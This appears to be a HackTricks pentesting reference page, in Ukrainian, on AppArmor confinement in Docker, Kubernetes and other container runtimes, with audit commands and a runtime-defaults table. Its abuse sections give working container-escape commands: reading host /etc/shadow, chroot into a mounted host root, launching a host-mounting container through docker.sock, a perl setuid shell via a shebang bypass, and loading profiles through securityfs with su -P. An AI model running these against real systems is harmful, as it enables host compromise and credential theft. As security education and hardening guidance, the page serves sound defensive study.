# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Огляд

AppArmor — це система **обов’язкового контролю доступу**, яка застосовує обмеження за допомогою профілів для окремих програм. На відміну від традиційних перевірок DAC, які значною мірою залежать від власника та групи користувача, AppArmor дає змогу ядру застосовувати політику, прив’язану безпосередньо до процесу. У контейнерних середовищах це важливо, адже робоче навантаження може мати достатньо традиційних привілеїв, щоб спробувати виконати дію, і все одно отримати відмову, оскільки профіль AppArmor не дозволяє відповідний шлях, монтування, мережеву поведінку чи використання можливостей.

Найважливіша концептуальна особливість AppArmor — **прив’язка до шляхів**. Він визначає доступ до файлової системи за правилами шляхів, а не за мітками, як це робить SELinux. Це робить його доступним для розуміння та потужним, але також означає, що прив’язкам монтувань і альтернативним структурам шляхів слід приділяти особливу увагу. Якщо той самий вміст хоста стає доступним за іншим шляхом, політика може діяти не так, як спочатку очікував оператор.

## Роль в ізоляції контейнерів

Під час перевірки безпеки контейнерів часто обмежуються можливостями та seccomp, але AppArmor залишається важливим і після цих перевірок. Уявіть контейнер із надмірними привілеями або робоче навантаження, якому з операційних причин потрібна була ще одна можливість. AppArmor усе одно може обмежувати доступ до файлів, поведінку монтувань, мережеву взаємодію та шаблони виконання, блокуючи очевидний шлях зловживання. Саме тому вимкнення AppArmor «просто щоб запустити застосунок» може непомітно перетворити лише ризиковану конфігурацію на таку, яку можна активно експлуатувати.

## Лабораторна робота

Щоб перевірити, чи активний AppArmor на хості, скористайтеся командою:

```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```

Щоб побачити, під яким профілем виконується поточний процес контейнера:

```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```

Різниця показова. У звичайному випадку процес має показувати контекст AppArmor, пов’язаний із профілем, вибраним runtime. У випадку unconfined цей додатковий рівень обмежень зникає.

Також можна перевірити, що, на думку Docker, було застосовано:

```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```

## Використання під час виконання

Docker може застосовувати стандартний або власний профіль AppArmor, якщо хост його підтримує. Podman також може інтегруватися з AppArmor у системах на його основі, хоча в дистрибутивах, де пріоритетним є SELinux, часто на перший план виходить інша система MAC. Kubernetes може надавати політики AppArmor на рівні робочого навантаження на вузлах, які справді підтримують AppArmor. LXC та пов’язані із ним середовища системних контейнерів сімейства Ubuntu також широко використовують AppArmor.

Практично важливо те, що AppArmor — це не «функція Docker». Це функція ядра хоста, яку можуть застосовувати різні середовища виконання. Якщо хост її не підтримує або середовищу виконання вказано запускати контейнер без обмежень, очікуваного захисту фактично немає.

У Kubernetes сучасний API — це `securityContext.appArmorProfile`. Починаючи з Kubernetes `v1.30`, старі анотації AppArmor у статусі beta вважаються застарілими. На підтримуваних хостах профіль `RuntimeDefault` використовується за замовчуванням, тоді як `Localhost` вказує на профіль, який уже має бути завантажений на вузлі. Це важливо враховувати під час перевірки: маніфест може виглядати сумісним з AppArmor, але повністю залежати від підтримки на боці вузла та попередньо завантажених профілів.<sup>[[1]](#references)</sup>

Є одна тонка, але корисна для адміністрування деталь: явне встановлення `appArmorProfile.type: RuntimeDefault` накладає суворіші вимоги, ніж просте пропускання цього поля. Якщо поле задано явно, а вузол не підтримує AppArmor, створення ресурсу має завершитися помилкою. Якщо поле пропущено, робоче навантаження може запуститися на вузлі без AppArmor, просто не отримавши цього додаткового рівня ізоляції. З погляду атакувальника, це вагома причина перевіряти і маніфест, і фактичний стан вузла.<sup>[[1]](#references)</sup>

На хостах з AppArmor, що підтримують Docker, найвідоміший стандартний профіль — `docker-default`. Цей профіль створюється на основі шаблону AppArmor від Moby, і він важливий, оскільки пояснює, чому деякі PoC, що спираються на capabilities, усе одно не працюють у стандартному контейнері. Загалом `docker-default` дозволяє звичайну роботу з мережею, забороняє запис у значну частину `/proc`, забороняє доступ до чутливих частин `/sys`, блокує операції монтування та обмежує ptrace, щоб його не можна було використовувати для довільного дослідження хоста. Розуміння цього базового рівня захисту допомагає відрізнити «контейнер має `CAP_SYS_ADMIN`» від «контейнер справді може використати цю capability для доступу до потрібних мені інтерфейсів ядра».

## Керування профілями

Профілі AppArmor зазвичай зберігаються в `/etc/apparmor.d/`. Поширене правило іменування — замінювати скісні риски у шляху до виконуваного файла крапками. Наприклад, профіль для `/usr/bin/man` зазвичай зберігається як `/etc/apparmor.d/usr.bin.man`. Це важливо як для захисту, так і для оцінювання безпеки: щойно ви дізнаєтеся назву активного профілю, відповідний файл часто можна швидко знайти на хості.

Серед корисних команд керування на хості є:

```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```

Причина, чому ці команди важливі в довіднику з безпеки контейнерів, полягає в тому, що вони пояснюють, як профілі насправді створюють, завантажують, перемикають у complain mode та змінюють після оновлення застосунків. Якщо оператор звик під час усунення несправностей перемикати профілі в complain mode і забуває повернути режим примусового застосування, контейнер може здаватися захищеним згідно з документацією, хоча насправді працюватиме зі значно слабшими обмеженнями.

### Створення й оновлення профілів

`aa-genprof` може спостерігати за поведінкою застосунку та допомагати інтерактивно створювати профіль:

```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```

`aa-easyprof` може згенерувати шаблонний профіль, який згодом можна завантажити за допомогою `apparmor_parser`:

```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```

Коли бінарний файл змінюється й політику потрібно оновити, `aa-logprof` може відтворити відмови, зафіксовані в журналах, і допомогти оператору вирішити, дозволити їх чи заборонити:

```bash
sudo aa-logprof
```

### Журнали

Відмови AppArmor часто можна побачити через `auditd`, syslog або такі інструменти, як `aa-notify`:

```bash
sudo aa-notify -s 1 -v
```

Це корисно з операційного та наступального погляду. Захисники використовують це, щоб уточнювати профілі. Атакувальники — щоб з’ясувати, який саме шлях або операцію заблоковано та чи є AppArmor засобом контролю, який блокує ланцюжок експлойтів.

### Визначення точного файлу профілю

Коли середовище виконання показує конкретну назву профілю AppArmor для контейнера, часто корисно зіставити цю назву з файлом профілю на диску:

```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```

Це особливо корисно під час перевірки на стороні хоста, оскільки допомагає перейти від твердження «контейнер повідомляє, що працює під профілем `lowpriv`» до розуміння, що «фактичні правила містяться в цьому конкретному файлі, який можна перевірити або перезавантажити».

### Правила з високою сигнальністю для аудиту

Якщо ви можете прочитати профіль, не обмежуйтеся простими рядками `deny`. Кілька типів правил істотно впливають на те, наскільки AppArmor захищатиме від спроби втечі з контейнера:<sup>[[2]](#references)</sup>

- `ux` / `Ux`: запускають цільовий бінарний файл без обмежень. Якщо доступний допоміжний процес, оболонка або інтерпретатор дозволені через `ux`, зазвичай саме це варто перевірити насамперед.
- `px` / `Px` і `cx` / `Cx`: виконують перехід між профілями під час exec. Самі по собі вони не є шкідливими, але їх варто перевірити, оскільки перехід може привести до профілю зі значно ширшими дозволами, ніж у поточного.
- `change_profile`: дозволяє завданню перейти до іншого завантаженого профілю — негайно або під час наступного exec. Якщо цільовий профіль слабший, це може стати передбаченим шляхом виходу з обмежувального домену.
- `flags=(complain)`, `flags=(unconfined)` або новіший `flags=(prompt)`: вони мають впливати на те, наскільки ви довіряєте профілю. `complain` записує відмови в журнал замість їх примусового застосування, `unconfined` прибирає межу захисту, а `prompt` залежить від рішення в userspace, а не лише від заборон, примусово застосованих ядром.
- `userns` або `userns create,`: новіші політики AppArmor можуть контролювати створення user namespace. Якщо профіль контейнера явно дозволяє це, вкладені user namespace залишаються доступними, навіть коли платформа використовує AppArmor як частину стратегії посилення захисту.

Корисна команда grep на стороні хоста:

```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```

Такий аудит часто корисніший, ніж перегляд сотень звичайних правил для файлів. Якщо breakout залежить від запуску допоміжної програми, входу в новий namespace або виходу в менш обмежувальний профіль, відповідь часто прихована саме в цих правилах переходу, а не в очевидних рядках на кшталт `deny /etc/shadow r`.

## Misconfigurations

Найочевидніша помилка — `apparmor=unconfined`. Адміністратори часто задають цей параметр, налагоджуючи програму, роботу якої профіль правильно заблокував через небезпечну або неочікувану дію. Якщо цей параметр залишається у production, рівень MAC фактично вимикається повністю.

Інша, менш очевидна проблема — припускати, що bind mounts нешкідливі, бо дозволи файлів здаються нормальними. Оскільки AppArmor працює на основі шляхів, надання доступу до шляхів хоста через альтернативні точки монтування може погано взаємодіяти з правилами для шляхів. Третя помилка — забувати, що ім’я профілю у файлі конфігурації мало що означає, якщо ядро хоста насправді не застосовує правила AppArmor.

## Abuse

Коли AppArmor вимкнено, можуть раптово запрацювати дії, які раніше обмежувалися: читання чутливих шляхів через bind mounts, доступ до частин procfs або sysfs, використання яких мало залишатися складнішим, виконання дій, пов’язаних із монтуванням, якщо це також дозволено capabilities/seccomp, або використання шляхів, доступ до яких профіль зазвичай забороняє. Саме AppArmor часто пояснює, чому спроба breakout на основі capabilities «мала б спрацювати» на папері, але на практиці не спрацьовує. Вимкніть AppArmor — і та сама спроба може почати вдаватися.

Якщо ви підозрюєте, що саме AppArmor зупиняє ланцюжок зловживання на основі path-traversal, bind mount або монтування, зазвичай перший крок — порівняти, що стає доступним із профілем і без нього. Наприклад, якщо шлях хоста змонтовано всередині контейнера, спочатку перевірте, чи можете ви пройти ним і прочитати його:

```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```

Якщо контейнер також має небезпечну capability, наприклад `CAP_SYS_ADMIN`, один із найпрактичніших тестів — з’ясувати, чи саме AppArmor блокує операції монтування або доступ до чутливих файлових систем ядра:

```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```

У середовищах, де шлях хоста вже доступний через bind mount, втрата AppArmor може також перетворити проблему розкриття інформації лише для читання на прямий доступ до файлів хоста:

```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```

Суть цих команд не в тому, що AppArmor сам по собі забезпечує вихід із контейнера. Вона в тому, що після вимкнення AppArmor одразу стають доступними для перевірки багато шляхів зловживання файловою системою та монтуванням.

### Повний приклад: AppArmor вимкнено + коренева файлова система хоста змонтована

Якщо кореневу файлову систему хоста вже змонтовано в контейнер за допомогою bind mount у `/host`, вимкнення AppArmor може перетворити заблокований шлях зловживання файловою системою на повний вихід на хост:

```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```

Щойно оболонка починає виконуватися через файлову систему хоста, робоче навантаження фактично виходить за межі контейнера:

```bash
id
hostname
cat /etc/shadow | head
```

### Повний приклад: AppArmor вимкнено + сокет середовища виконання

Якщо справжнім бар’єром був AppArmor, що захищав стан середовища виконання, для повного виходу може вистачити змонтованого сокета:

```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```

Точний шлях залежить від точки монтування, але результат однаковий: AppArmor більше не перешкоджає доступу до API середовища виконання, і через цей API можна запустити контейнер, що скомпрометує хост.

### Повний приклад: обхід захисту за шляхом за допомогою Bind-Mount

Оскільки AppArmor працює на основі шляхів, захист `/proc/**` не забезпечує автоматичного захисту того самого вмісту procfs хоста, якщо до нього можна дістатися за іншим шляхом:

```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```

Вплив залежить від того, що саме змонтовано і чи обходить альтернативний шлях також інші засоби контролю, але цей шаблон — одна з найочевидніших причин, чому AppArmor слід оцінювати разом із конфігурацією монтування, а не ізольовано.

### Повний приклад: обхід через shebang

AppArmor може призначити профіль виконуваному скрипту, а не інтерпретатору, вказаному в його shebang. І навпаки, прямий запуск інтерпретатора може вибрати профіль цього інтерпретатора. [Супровідник AppArmor описує цю відмінність](https://bugs.launchpad.net/apparmor/+bug/1911431). Історичний приклад стосувався скрипту, перший рядок якого вказував на обмежений інтерпретатор:

```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```

Цей приклад — лише потенційний випадок, коли file capability інтерпретатора може стати ефективною, а фактичне exec-прикріплення скрипту дозволяє виконати операцію. Перевірте завантажену політику й мітку процесу, capability bounding set, `no_new_privs` і стан `nosuid` для монтування; сама назва файлу профілю або запис `cap_setuid+ep` не доводять, що перехід можливий. Ланцюжки інтерпретаторів та альтернативні шляхи виконання слід розглядати окремо.

## Файли керування політикою як привілейований примітив запису

У вразливих ядрах AppArmor непривілейований користувач може відкрити файл securityfs `.load`, `.replace` або `.remove` для запису, але прямий виклик `write()` завершується помилкою, оскільки право адміністратора політики перевіряється під час запису. Якщо setuid-хелпер успадковує цей дескриптор як stdout або stderr і записує контрольовані зловмисником байти, ядро використовує облікові дані хелпера. Це робить хелпер *привілейованим записувачем* даних політики, але не надає користувачу загальний доступ root. Qualys продемонструвала, що `su -P` може передавати байти від команди, запущеної від імені того самого користувача, через привілейований шлях PTY; для цього способу потрібен пароль облікового запису користувача. Перевірте виправлення для встановленого ядра й `su`, а не вважайте режим доступу на запис для всіх доказом вразливості.<sup>[[3]](#references)[[4]](#references)</sup>

У тимчасовому лабораторному середовищі з вразливим ядром і хелпером це створює, а потім видаляє тестовий профіль. Оболонка відкриває кожен керівний файл до того, як `su` виконає запис; `stty raw` запобігає зміні скомпільованих байтів профілю під час передавання через PTY. Не запускайте цей тест із робочим профілем.<sup>[[3]](#references)</sup>

```bash
printf '/usr/bin/true {\n}\n' > /tmp/ht-aa-probe
apparmor_parser -K -o /tmp/ht-aa-probe.pf /tmp/ht-aa-probe
su -P -c 'stty raw && cat /tmp/ht-aa-probe.pf' "$USER" > /sys/kernel/security/apparmor/.load
grep '/usr/bin/true ' /sys/kernel/security/apparmor/profiles
su -P -c 'stty raw && printf %s /usr/bin/true' "$USER" > /sys/kernel/security/apparmor/.remove
```

Той самий примітив може замінити наявний профіль. Наприклад, профіль, який дозволяє `userns` для програми запуску, може зняти обмеження AppArmor на user namespace, але він не надає capabilities суперкористувача хоста; фактичні sysctl-параметри namespace та інші засоби контролю все ще мають значення. Він також може зняти обмеження з цільового процесу. Перегляньте [перевірки вразливостей ядра](../../../main-system-information/kernel-vulnerability-assessment.md) та [огляд Linux Hardening](../../../), щоб ознайомитися з ширшим процесом підвищення привілеїв.<sup>[[3]](#references)[[4]](#references)</sup>

## Перевірки

Мета цих перевірок — швидко відповісти на три запитання: чи ввімкнено AppArmor на хості, чи обмежений поточний процес і чи справді runtime застосував профіль до цього контейнера?

```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```

Що тут цікаво:

- Якщо `/proc/self/attr/current` показує `unconfined`, робоче навантаження не захищене обмеженнями AppArmor.
- Якщо `aa-status` показує, що AppArmor вимкнено або не завантажено, будь-яка назва профілю в конфігурації runtime здебільшого є лише косметичною.
- Якщо `docker inspect` показує `unconfined` або неочікуваний власний профіль, це часто пояснює, чому спрацьовує шлях зловживання, пов’язаний із файловою системою або монтуванням.
- Якщо `/sys/kernel/security/apparmor/profiles` не містить очікуваного профілю, самої конфігурації runtime або оркестратора недостатньо.
- Якщо в нібито посиленому профілі є правила на кшталт `ux`, широкого `change_profile`, `userns` або `flags=(complain)`, фактичний рівень захисту може бути значно слабшим, ніж можна припустити з назви профілю.

Якщо контейнер уже має підвищені привілеї з операційних причин, увімкнений AppArmor часто визначає, чи залишиться виняток контрольованим, чи переросте в значно масштабніший збій безпеки.

## Стандартні налаштування runtime

| Runtime / платформа | Стан за замовчуванням | Поведінка за замовчуванням | Типове ручне послаблення |
| --- | --- | --- | --- |
| Docker Engine | Увімкнено за замовчуванням на хостах із підтримкою AppArmor | Використовує профіль AppArmor `docker-default`, якщо його не перевизначено | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Залежить від хоста | AppArmor підтримується через `--security-opt`, але точне значення за замовчуванням залежить від хоста та runtime і менш універсальне, ніж документований профіль Docker `docker-default` | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Умовне значення за замовчуванням | Якщо `appArmorProfile.type` не вказано, використовується `RuntimeDefault`, але лише за умови, що AppArmor увімкнено на вузлі | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` зі слабким профілем, вузли без підтримки AppArmor |
| containerd / CRI-O під Kubernetes | Залежить від підтримки вузлом/runtime | Типові runtime, підтримувані Kubernetes, сумісні з AppArmor, але фактичне застосування обмежень усе одно залежить від підтримки вузлом і налаштувань робочого навантаження | Як у рядку Kubernetes; пряма конфігурація runtime також може повністю пропустити AppArmor |

Для AppArmor найважливішою змінною часто є **хост**, а не лише runtime. Налаштування профілю в маніфесті не забезпечує обмежень на вузлі, де AppArmor не ввімкнено.
